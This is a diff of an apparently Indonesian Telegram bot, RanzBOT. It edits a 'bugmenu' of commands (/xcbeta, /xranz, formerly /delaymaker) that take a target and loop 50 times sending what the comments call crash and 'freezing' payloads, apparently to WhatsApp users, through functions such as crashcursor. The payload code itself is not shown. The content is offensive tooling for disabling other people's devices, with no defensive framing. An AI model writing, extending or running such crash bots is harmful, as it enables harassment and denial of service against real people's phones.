@@ -456,8 +456,8 @@ Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Memban
 ╭──(     \`ʙᴜɢᴍᴇɴᴜ\`     )
 │
 ㅒ
-│ /xcbeta ( Crash? idk )
-│ /delaymaker 1 hour ( Andro only )
+│ /xcbeta
+│ /xranz
 ㅒ
 │
 ╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
@@ -1478,7 +1478,7 @@ bot.command("xcbeta", cooldownMiddleware, checkWhatsAppConnection, async ctx => 
   // Menyelesaikan proses response
   await donerespone(target, ctx);
 });
-bot.command("delaymaker", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
+bot.command("xranz", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
 
@@ -1497,7 +1497,7 @@ bot.command("delaymaker", cooldownMiddleware, checkWhatsAppConnection, async ctx
 
   // Melakukan proses freezing 50 kali
   for (let i = 0; i < 50; i++) {
-    await XeonXRobust(target, { ptcp: true });
+    await crashcursor(target, { ptcp: true });
     await caywzzaja_notif(target, { ptcp: true });
   }
 
